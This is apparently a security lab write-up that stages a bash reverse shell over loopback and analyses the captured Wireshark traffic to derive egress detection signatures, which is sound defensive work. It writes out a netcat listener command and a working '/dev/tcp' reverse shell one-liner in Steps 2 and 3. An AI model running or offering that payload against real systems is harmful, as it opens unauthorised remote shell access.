# Project 3: Reverse Shell Network Detection Study

## 1. Project Overview
This project simulates an active post-compromise egress pivot utilizing an interactive **reverse shell** stream over an unencrypted transport channel. By mirroring real-world adversary behavior within an isolated virtual local area network (VLAN), this lab captures, isolates, and analyzes raw packet data (PCAPs) via **Wireshark** to establish robust, data-driven network-layer detection signatures for Security Operations Center (SOC) environments.

---

## 2. Technical Topology & Architecture
The lab monitors directional outbound socket connections routed internally via the local loopback interface:

[ Target Context (Victim) ] =(Outbound /bin/bash Stream)=> [ Local Loopback (lo) ]|(Packet Capture)|v[ Attacker Context (Kali) ] <=(Active Netcat Port 4444)= [ Wireshark Engine ]
---

## 3. Deployment & Execution Steps

### Step 1: Telemetry Sensor Initialization
Wireshark was initialized with administrative privileges on the local loopback interface (`lo`). A structural display filter was applied to immediately isolate the target testing infrastructure from background operating system noise:
tcp.port == 4444

<img width="1919" height="965" alt="Screenshot 2026-06-27 145852" src="https://github.com/user-attachments/assets/a186d33f-171a-47c7-a0a1-84e4c7d993d5" />

Step 2: Provisioning the Offensive ListenerA network socket utility (netcat) was deployed in an open listening state on the host interface, bound explicitly to a common non-standard port to await inbound handshakes from the target environment:Bashnc -lvnp 4444
Step 3: Executing the Egress Pivot PayloadOn the target interface, a native interactive shell wrapper was executed. This instruction manipulates standard system file descriptors to route the shell processing engine (/bin/bash) over an outbound TCP socket to the listener machine:Bashbash -c "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"

<img width="1919" height="969" alt="Screenshot 2026-06-27 145949" src="https://github.com/user-attachments/assets/436b190f-70ca-4836-bed5-ceedaa55ef1e" />

Step 4: Enumeration & Stream TerminationUpon shell connection validation, manual discovery commands (whoami, hostname) were executed through the listener interface to generate standard administrative telemetry traffic before the stream was ended cleanly using the exit command string.

4. Analytical Results & Verification MatrixBy evaluating the raw packet capture layers via Wireshark's Follow TCP Stream decoding utility, the foundational architectural footprints of the reverse shell were successfully extracted.

Technical Metric,Observed Lab Value,Defensive Threat Classification
Connection Direction,Outbound from random high port,Egress Anomaly (Bypasses traditional ingress rules)
Payload Encryption,"Cleartext ASCII text (whoami, exit)",Unencrypted Command & Control (C2) Channel
Transport Protocol,Stream-oriented TCP Flags,Persistent Session (Lingering stateful connection)

================================================================================
KALI ATTACKER NODE (PORT 4444) <---> LOCAL LOOPBACK TARGET (EPHEMERAL PORT)
================================================================================
kali@kali:~$ whoami
kali
kali@kali:~$ hostname
kali
kali@kali:~$ exit
exit
================================================================================

<img width="1919" height="974" alt="Screenshot 2026-06-27 145829" src="https://github.com/user-attachments/assets/f706e98b-899e-473d-ab3d-c41548da220e" />

5. Key Cybersecurity TakeawaysThe Egress Evasion Vulnerability: Standard perimeter firewalls heavily restrict inbound requests but inherently trust outbound traffic. Reverse shells abuse this logic, making rigorous egress port filtering a mandatory security baseline.Protocol Incongruity Auditing: While port 4444 was utilized for this lab, adversaries often route reverse shells over standard open ports like HTTP (80) or HTTPS (443). Security sensors must use Deep Packet Inspection (DPI) to look past the port number and catch shell prompts hidden inside standard web lanes.Heuristic Signal Tracking: Detecting unencrypted shells does not rely solely on finding static signatures. Security orchestration platforms must flag abnormal behavioral patterns, such as an internal endpoint sustaining a long-term interactive socket with a completely external public network space.
